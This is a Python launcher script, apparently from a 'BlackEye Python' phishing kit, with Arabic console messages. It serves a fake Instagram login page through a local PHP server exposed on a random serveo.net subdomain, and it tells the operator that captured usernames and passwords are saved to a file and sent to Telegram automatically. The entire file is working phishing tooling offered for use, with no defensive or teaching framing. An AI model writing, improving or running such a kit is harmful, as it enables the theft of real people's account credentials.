import os
import sys
import subprocess
import time
import webbrowser
import argparse
import json
from urllib.parse import urlparse

class colors:
    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'
    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'
    END      = '\33[0m'

def print_colored(text, color=colors.WHITE, bold=False):
    """Print colored text"""
    style = '\033[1m' if bold else ''
    print(f"{style}{color}{text}{colors.END}")

try:
    from theme import colors, print_colored

    print_colored("\n🚀 تشغيل قالب Instagram مباشرة...", colors.GREEN, bold=True)
    print_colored("📱 جاري إعداد الخادم لاستقبال بيانات Instagram", colors.BLUE)

    # تحديد نطاق فرعي تلقائي
    import random
    import string
    subdomain = 'insta-' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

    print_colored(f"\n🌐 رابط الصفحة المزيفة: https://{subdomain}.serveo.net", colors.YELLOW, bold=True)
    print_colored("📝 البيانات ستُحفظ في: sites/instagram/usernames.txt", colors.BLUE)
    print_colored("📱 سيتم إرسال البيانات إلى Telegram تلقائياً!", colors.GREEN)
    print_colored("\n⚠️  لإيقاف الخادم اضغط Ctrl+C", colors.RED)
    print_colored("="*60, colors.WHITE)

    # بدء خادم Instagram
    choice = 'instagram'
    
    print_colored(f"\n🔧 تشغيل خادم PHP...", colors.BLUE)

    try:
        # تشغيل خادم PHP المحلي
        print_colored(f"\n✅ الخادم يعمل على المنفذ 5000", colors.GREEN, bold=True)
        print_colored("🌐 يمكنك الوصول للصفحة المزيفة عبر الرابط في الأعلى", colors.BLUE)
        print_colored("📊 مراقبة الاتصالات والبيانات...", colors.BLUE)
        print_colored("📱 البيانات ستصل على Telegram تلقائياً!", colors.GREEN)
        
        # تشغيل خادم PHP
        p = subprocess.Popen(f"php -S 0.0.0.0:5000 -t sites/{choice}", shell=True)
        
        # انتظار إيقاف الخادم
        p.wait()

    except KeyboardInterrupt:
        print_colored("\n\n⏹️  تم إيقاف الخادم", colors.YELLOW)
        print_colored("شكراً لاستخدام BlackEye Python!", colors.GREEN)
        try:
            p.terminate()
        except:
            pass

except KeyboardInterrupt:
    print_colored("\n\nتم إيقاف البرنامج", colors.YELLOW)
except Exception as e:
    print_colored(f"خطأ: {e}", colors.RED)